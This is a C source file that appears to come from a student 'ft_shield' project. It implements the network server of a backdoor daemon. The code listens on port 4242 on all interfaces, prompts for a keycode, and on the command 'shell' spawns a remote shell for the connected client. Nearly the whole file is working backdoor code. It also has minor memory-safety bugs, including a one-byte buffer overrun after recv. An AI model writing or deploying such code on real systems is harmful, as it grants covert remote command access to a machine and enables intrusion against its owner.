# include "ft_shield.h"

static Client client_arr[MAX_CLIENTS];

void init_server(Server *server, int port_number, const char *password) 
{
    server->_port_number = port_number;
    server->_password = strdup(password);
}

void create_socket(Server *server) 
{
    int opt = 1;
    server->_socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server->_socket_fd < 0) {
        perror("ERROR OPENING SOCKET");
        exit(EXIT_FAILURE);
    }
    if (setsockopt(server->_socket_fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        perror("ERROR OPENING SETSOCKETOPT");
        exit(EXIT_FAILURE);
    }
}

void bind_socket(Server *server)
{
    memset((char *)&server->_serv_addr, 0, sizeof(server->_serv_addr));
    server->_serv_addr.sin_family = AF_INET;
    server->_serv_addr.sin_addr.s_addr = INADDR_ANY;
    server->_serv_addr.sin_port = htons(server->_port_number);
    if (bind(server->_socket_fd, (struct sockaddr *)&server->_serv_addr, sizeof(server->_serv_addr)) < 0) {
        perror("ERROR ON BINDING");
        exit(EXIT_FAILURE);
    }
}

void listen_socket(Server *server)
{
    if (listen(server->_socket_fd, MAX_CLIENTS) < 0) {
        perror("ERROR ON LISTEN");
        exit(EXIT_FAILURE);
    }
}


void read_write_socket(Client* client_arr,  int sock, int *numfds)
{
    int n;
    char buffer[BUFFER_SIZE];
    bzero(buffer, BUFFER_SIZE);
    n = recv(sock, buffer, BUFFER_SIZE, 0);
    if (n == 0) {
        close(sock);
        remove_client(client_arr, sock);
        (*numfds)--;
    }
    if (n < 0) {
        perror("ERROR READING FROM SOCKET");
        exit(EXIT_FAILURE);
    }
    if (n > 1) {
        buffer[n] = '\0';
        if (buffer[n - 1] == '\n')
            buffer[n - 1] = '\0';
        if (strcmp(buffer, "?") == 0) 
        {
            send(sock, "? show help\n", 13, 0);
        }
        else if (strcmp(buffer, "shell") == 0) 
        {
            send(sock, "Spawning shell on port 4242\n", 29, 0);
            launch_shell(sock, client_arr, numfds);
        }
    }
}

void accept_socket(Server *server)
{
    int numfds = 1;
    int client_length = sizeof(server->_cli_addr);
    server->_fds[0].fd = server->_socket_fd;
    server->_fds[0].events = POLLIN;

    while (1) {
        int ret = poll(server->_fds, numfds, -1);
        if (ret < 0) {
            perror("ERROR ON POLL");
            exit(EXIT_FAILURE);
        }

        for (int i = 0; i < numfds; i++) {
            if (server->_fds[i].revents & POLLIN) {
                if (server->_fds[i].fd == server->_socket_fd) {
                    server->_new_socket_fd = accept(server->_socket_fd, (struct sockaddr *)&server->_cli_addr, (socklen_t *)&client_length);
                    if (server->_new_socket_fd < 0) {
                        perror("ERROR ON ACCEPT");
                        exit(EXIT_FAILURE);
                    }
                    if (numfds > MAX_CLIENTS) {
                        send(server->_new_socket_fd, "Server is full\n", 15, 0);
                        close(server->_new_socket_fd);
                    } else {
                        server->_fds[numfds].fd = server->_new_socket_fd;
                        server->_fds[numfds].events = POLLIN;
                        numfds++;
                        add_client(client_arr, server->_new_socket_fd);
                        send(server->_new_socket_fd, "Keycode: ", 9, 0);
                    }
                } else {
                    if (!is_autheticated(client_arr, server->_fds[i].fd)){
                        if(authenticate(server->_fds[i].fd, client_arr, &numfds)){
                            make_autheticated(client_arr, server->_fds[i].fd);
                        }
                    } else {
                        read_write_socket(client_arr, server->_fds[i].fd, &numfds);
                    }
                }
            }
        }
    }
}

void close_socket(int socket_fd)
{
    close(socket_fd);
}

void server() {
    Server server;
    init_server(&server, 4242, AUTH_PASSWORD_HASH);
    create_socket(&server);
    bind_socket(&server);
    listen_socket(&server);
    accept_socket(&server);
}
